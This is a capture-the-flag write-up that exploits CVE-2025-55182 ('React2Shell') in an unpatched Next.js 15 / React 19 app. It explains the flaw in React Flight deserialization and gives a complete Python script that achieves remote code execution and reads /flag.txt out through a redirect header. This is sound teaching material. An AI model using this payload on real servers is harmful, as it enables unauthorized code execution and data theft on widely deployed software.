# Dow is Up 50k - Solve & Writeup

## Challenge Information
- **Category:** Web Exploitation
- **Points:** 10
- **Author:** Veryyes
- **Description:** 
  > SHOP NOW, PAY later, DASH home, cry in the BOX.
  >
  > Mirror 1: `http://18.215.143.250:3000`  
  > Mirror 2: `http://18.145.136.91:3000`
  >
  > **Hint:** *When did you say you made this website?*
- **Flag:** `rstcon{pr0t0typ3_p0llut10n_m3ets_r34ct_fl1ght}`

---

## 1. Challenge Reconnaissance & Hint Analysis

### Clues & Contradictions
1. **Challenge Hint:**
   > *When did you say you made this website?*
2. **Footer on the Web Application:**
   ```text
   Next.js 15 · React 19 · Built Dec 2, 2025
   ```
3. **The Date Significance:**
   - On **December 3, 2025**, the critical zero-day vulnerability **CVE-2025-55182 ("React2Shell" / CVE-2025-66478)** was publicly disclosed.
   - The application claims to have been **"Built Dec 2, 2025"**—precisely one day prior to the emergency patch releases (`19.0.1`, `19.1.2`, `19.2.1`).
   - This indicates that the Next.js 15 / React 19 instance runs an unpatched version of `react-server-dom-webpack`, vulnerable to pre-authentication Remote Code Execution via React Flight deserialization prototype pollution.

---

## 2. Vulnerability Mechanics: CVE-2025-55182 ("React2Shell")

### React Server Components (RSC) & Flight Deserialization
When a client sends an HTTP `POST` request to a Next.js App Router endpoint targeting a Server Action (via the `Next-Action` header), the server deserializes the payload using the React Flight protocol (`react-server-dom-webpack`).

In unpatched versions:
1. `react-server-dom-webpack` processes multipart form fields (`0`, `1`, etc.) as chunk streams.
2. During chunk deserialization in `reviveModel`, property traversal on chunk references (`$1:...`) fails to sanitize `__proto__` and `constructor` access.
3. Supplying:
   - Field `1`: `"$@0"` (a raw reference to chunk `0`).
   - Field `0`: A malicious JSON object referencing `$1:constructor:constructor` (which traverses up to `Function.prototype.constructor`, i.e., `Function`).
   - Triggering the `$B` (Blob) reference handler inside `initializeModelChunk` causes the server to evaluate:
     ```javascript
     Function(prefix + "0")();
     ```
   - This executes arbitrary JavaScript inside the Node.js server context!

### Data Exfiltration via `NEXT_REDIRECT`
In Next.js production builds (`next start`), generic error messages are redacted. However, Next.js handles redirects by throwing special redirect error objects with a `.digest` property matching:
```javascript
throw Object.assign(new Error(), {
    digest: 'NEXT_REDIRECT;push;/' + exfiltrated_data + ';307;'
});
```
When this error is thrown, Next.js places the redirect target into the `x-action-redirect` HTTP response header, giving a clean, direct channel for in-band data exfiltration!

---

## 3. Exploit Implementation

### Discovered Server Action
From the client chunk `app/page-dcea1cd040fd23a5.js`:
- Action ID: `40881a01be516941afc21e3145707ceff4a34545af` (`searchStocks`)

### Exploit Payload Script (`get_flag.py`)
```python
#!/usr/bin/env python3
import urllib.request, uuid

BASE = "http://18.215.143.250:3000"
ACTION_SEARCH = "40881a01be516941afc21e3145707ceff4a34545af"

class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

opener = urllib.request.build_opener(NoRedirectHandler)
boundary = '----WebKitFormBoundary' + uuid.uuid4().hex

# Node.js payload: read /flag.txt, hex-encode it, and throw a NEXT_REDIRECT error
cmd = "var out = process.mainModule.require('fs').readFileSync('/flag.txt', 'utf8').trim(); " \
      "throw Object.assign(new Error(), {digest: 'NEXT_REDIRECT;push;/' + Buffer.from(out).toString('hex') + ';307;'});"
prefix = cmd.replace('\\', '\\\\').replace('"', '\\"') + '//'

chunk0 = '{\n' + \
         '  "then": "$1:__proto__:then",\n' + \
         '  "status": "resolved_model",\n' + \
         '  "reason": -1,\n' + \
         '  "_response": {\n' + \
         '    "_prefix": "' + prefix + '",\n' + \
         '    "_formData": {\n' + \
         '      "get": "$1:constructor:constructor"\n' + \
         '    }\n' + \
         '  },\n' + \
         '  "value": "{\\"then\\":\\"$B0\\"}"\n' + \
         '}'

chunk1 = '"$@0"'

body = f'--{boundary}\r\nContent-Disposition: form-data; name="0"\r\n\r\n{chunk0}\r\n' \
       f'--{boundary}\r\nContent-Disposition: form-data; name="1"\r\n\r\n{chunk1}\r\n' \
       f'--{boundary}--\r\n'.encode()

req = urllib.request.Request(
    BASE,
    data=body,
    headers={
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Next-Action': ACTION_SEARCH
    }
)

try:
    resp = opener.open(req, timeout=10)
    redir = resp.headers.get('x-action-redirect', '')
except urllib.error.HTTPError as e:
    redir = e.headers.get('x-action-redirect', '')

hex_str = redir.split(';')[0].lstrip('/')
flag = bytes.fromhex(hex_str).decode('utf-8', 'ignore')
print(f"[+] Flag: {flag}")
```

---

## 4. Execution Output & Flag

```text
HEX: 727374636f6e7b7072307430747970335f70306c6c757431306e5f6d336574735f72333463745f666c316768747d
FLAG: rstcon{pr0t0typ3_p0llut10n_m3ets_r34ct_fl1ght}
```

### Final Flag
```text
rstcon{pr0t0typ3_p0llut10n_m3ets_r34ct_fl1ght}
```
